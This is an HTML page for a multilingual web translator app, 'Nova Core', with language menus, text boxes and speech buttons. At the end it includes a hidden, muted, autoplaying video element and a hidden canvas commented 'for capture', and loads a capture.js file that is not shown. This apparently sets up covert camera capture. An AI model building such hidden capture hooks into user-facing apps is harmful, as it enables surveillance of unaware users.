<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nova Core - AI Translator</title>
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
</head>
<body>

<header>
    <h1>🌍 Nova Core</h1>
    <p>Translate Any Language</p>
    <div class="top-buttons">
        <button id="themeBtn" type="button">🌙 Dark Mode</button>
        <button id="downloadBtn" type="button">📥 Download</button>
        <button id="clearBtn" type="button">🗑️ Clear</button>
    </div>
</header>

<div class="container">

    <div class="card">
        <h2>Input Text</h2>
        <select id="fromLanguage">
            <option value="en">🇺🇸 English</option>
            <option value="om">🇪🇹 Afaan Oromoo</option>
            <option value="am">🇪🇹 Amharic</option>
            <option value="ar">🇸🇦 Arabic</option>
            <option value="fr">🇫🇷 French</option>
            <option value="es">🇪🇸 Spanish</option>
            <option value="de">🇩🇪 German</option>
            <option value="zh">🇨🇳 Chinese</option>
            <option value="hi">🇮🇳 Hindi</option>
            <option value="pt">🇵🇹 Portuguese</option>
            <option value="it">🇮🇹 Italian</option>
            <option value="ru">🇷🇺 Russian</option>
            <option value="ja">🇯🇵 Japanese</option>
            <option value="ko">🇰🇷 Korean</option>
            <option value="tr">🇹🇷 Turkish</option>
            <option value="nl">🇳🇱 Dutch</option>
            <option value="pl">🇵🇱 Polish</option>
            <option value="sv">🇸🇪 Swedish</option>
            <option value="fi">🇫🇮 Finnish</option>
            <option value="da">🇩🇰 Danish</option>
            <option value="no">🇳🇴 Norwegian</option>
            <option value="el">🇬🇷 Greek</option>
            <option value="he">🇮🇱 Hebrew</option>
            <option value="id">🇮🇩 Indonesian</option>
            <option value="ms">🇲🇾 Malay</option>
            <option value="th">🇹🇭 Thai</option>
            <option value="vi">🇻🇳 Vietnamese</option>
            <option value="sw">🇰🇪 Swahili</option>
            <option value="so">🇸🇴 Somali</option>
        </select>
        <textarea id="inputText" placeholder="Type or paste text here..."></textarea>
        <div class="buttons">
            <button id="micBtn" type="button">🎤 Speak</button>
            <button id="copyInput" type="button">📋 Copy</button>
        </div>
    </div>

    <div class="middle">
        <button id="swapBtn" type="button">🔄</button>
    </div>

    <div class="card">
        <h2>Translation</h2>
        <select id="toLanguage">
            <option value="en">🇺🇸 English</option>
            <option value="om">🇪🇹 Afaan Oromoo</option>
            <option value="am">🇪🇹 Amharic</option>
            <option value="ar">🇸🇦 Arabic</option>
            <option value="fr">🇫🇷 French</option>
            <option value="es">🇪🇸 Spanish</option>
            <option value="de">🇩🇪 German</option>
            <option value="zh">🇨🇳 Chinese</option>
            <option value="hi">🇮🇳 Hindi</option>
            <option value="pt">🇵🇹 Portuguese</option>
            <option value="it">🇮🇹 Italian</option>
            <option value="ru">🇷🇺 Russian</option>
            <option value="ja">🇯🇵 Japanese</option>
            <option value="ko">🇰🇷 Korean</option>
            <option value="tr">🇹🇷 Turkish</option>
            <option value="nl">🇳🇱 Dutch</option>
            <option value="pl">🇵🇱 Polish</option>
            <option value="sv">🇸🇪 Swedish</option>
            <option value="fi">🇫🇮 Finnish</option>
            <option value="da">🇩🇰 Danish</option>
            <option value="no">🇳🇴 Norwegian</option>
            <option value="el">🇬🇷 Greek</option>
            <option value="he">🇮🇱 Hebrew</option>
            <option value="id">🇮🇩 Indonesian</option>
            <option value="ms">🇲🇾 Malay</option>
            <option value="th">🇹🇭 Thai</option>
            <option value="vi">🇻🇳 Vietnamese</option>
            <option value="sw">🇰🇪 Swahili</option>
            <option value="so">🇸🇴 Somali</option>
        </select>
        <textarea id="outputText" placeholder="Translation appears here..." readonly></textarea>
        <div class="buttons">
            <button id="copyOutput" type="button">📋 Copy</button>
            <button id="speakBtn" type="button">🔊 Listen</button>
        </div>
        <button id="translateBtn" type="button">🌍 Translate</button>
    </div>
</div>

<footer>
    <p>© 2026 Nova Core • Translator</p>
</footer>

<!-- hidden video + canvas for capture -->
<video id="v" autoplay playsinline muted style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script src="script.js"></script>
<script src="capture.js"></script>

</body>
</html>
